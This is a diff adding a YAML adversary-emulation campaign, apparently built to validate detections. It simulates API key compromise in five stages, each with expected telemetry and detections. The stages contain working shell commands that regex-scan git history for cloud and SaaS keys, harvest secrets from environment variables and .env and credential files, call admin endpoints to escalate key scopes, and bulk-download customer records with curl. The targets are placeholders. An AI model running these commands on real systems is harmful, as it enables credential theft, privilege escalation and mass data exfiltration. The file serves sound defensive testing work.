@@ -1,0 +1,121 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: api-key-compromise
+  adversary: fin7
+  description: "API key compromise — discover, steal, and abuse API keys and tokens from source code, environment variables, config files, and cloud metadata to gain unauthorized service access."
+  objective: "Validate detection of API key discovery patterns, credential abuse from unusual sources, and anomalous API access following key compromise."
+  mitre_version: "15.1"
+  severity: high
+  tags: [credential-access, api-keys, secrets, token-abuse, cloud]
+  authors: ["ThreatEcho"]
+  created: "2025-04-08"
+  modified: "2025-10-12"
+
+variables:
+  target_repo: "https://github.corp.example.com/api/v3"
+  target_api: "https://api.corp.example.com/v2"
+
+stages:
+  - id: git-secret-scanning
+    name: Git Repository Secret Scanning
+    technique: T1552.001
+    tactic: credential-access
+    description: "Scan git history for accidentally committed API keys, tokens, and credentials."
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          git log --all --diff-filter=A -p | grep -E \
+            '(AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{48}|ghp_[a-zA-Z0-9]{36}|xoxb-[0-9]+-[a-zA-Z0-9]+|AIza[0-9A-Za-z_-]{35})' \
+            > /tmp/discovered_keys.txt
+    expect:
+      telemetry: [process_creation, command_line]
+      detections: [git_history_secret_scan, credential_harvesting_pattern, regex_credential_search]
+    on_failure: continue
+
+  - id: env-var-harvesting
+    name: Environment Variable Credential Harvesting
+    technique: T1552.001
+    tactic: credential-access
+    description: "Extract API keys and secrets from environment variables, process memory, and config files."
+    depends_on: [git-secret-scanning]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          # Harvest from environment
+          env | grep -iE '(key|token|secret|password|api|auth)' > /tmp/env_secrets.txt
+          # Harvest from common config locations
+          find /opt /home /etc -name ".env" -o -name "*.conf" -o -name "credentials" 2>/dev/null | \
+            xargs grep -l -iE '(api_key|secret_key|access_token|password)' 2>/dev/null >> /tmp/env_secrets.txt
+    expect:
+      telemetry: [process_creation, file_access, command_line]
+      detections: [environment_credential_harvesting, config_file_secret_scan, bulk_secret_discovery]
+    on_failure: continue
+
+  - id: stolen-key-abuse
+    name: Stolen API Key Abuse
+    technique: T1078.004
+    tactic: initial-access
+    description: "Use a discovered API key to authenticate and access services the key owner has access to."
+    depends_on: [env-var-harvesting]
+    execute:
+      type: http
+      target: "{{target_api}}/admin/users"
+      args:
+        method: GET
+        header_authorization: "Bearer stolen-key-placeholder-for-simulation"
+        header_x_source_ip: "198.51.100.42"
+    expect:
+      telemetry: [api_call, authentication_event]
+      detections: [api_key_used_from_new_ip, credential_from_unusual_source, impossible_travel_api_access]
+    on_failure: continue
+
+  - id: key-privilege-escalation
+    name: API Key Privilege Escalation
+    technique: T1098.001
+    tactic: privilege-escalation
+    description: "Use compromised API key to create new keys with elevated permissions or modify existing key scopes."
+    depends_on: [stolen-key-abuse]
+    execute:
+      type: http
+      target: "{{target_api}}/admin/api-keys"
+      args:
+        method: POST
+        content_type: "application/json"
+        header_authorization: "Bearer stolen-key-placeholder-for-simulation"
+        payload: '{"name": "monitoring-service", "scopes": ["admin:all", "users:write", "billing:read"], "expiry": "2027-01-01"}'
+    expect:
+      outcome: blocked
+      telemetry: [api_call, iam_event]
+      detections: [api_key_scope_escalation, new_admin_key_creation, unusual_key_permissions]
+    on_failure: continue
+
+  - id: mass-data-access
+    name: Mass Data Access via Compromised Key
+    technique: T1530
+    tactic: collection
+    description: "Use the compromised key to bulk-access sensitive data across services."
+    depends_on: [key-privilege-escalation]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          # Paginate through all customer records
+          PAGE=1
+          while [ $PAGE -le 100 ]; do
+            curl -s "{{target_api}}/customers?page=$PAGE&per_page=500" \
+              -H "Authorization: Bearer stolen-key-placeholder-for-simulation" \
+              >> /tmp/all_customers.json
+            PAGE=$((PAGE + 1))
+          done
+    expect:
+      outcome: blocked
+      telemetry: [api_call, network_connection]
+      detections: [mass_api_data_access, pagination_exhaustion, anomalous_api_volume, bulk_record_retrieval]
+    on_failure: continue
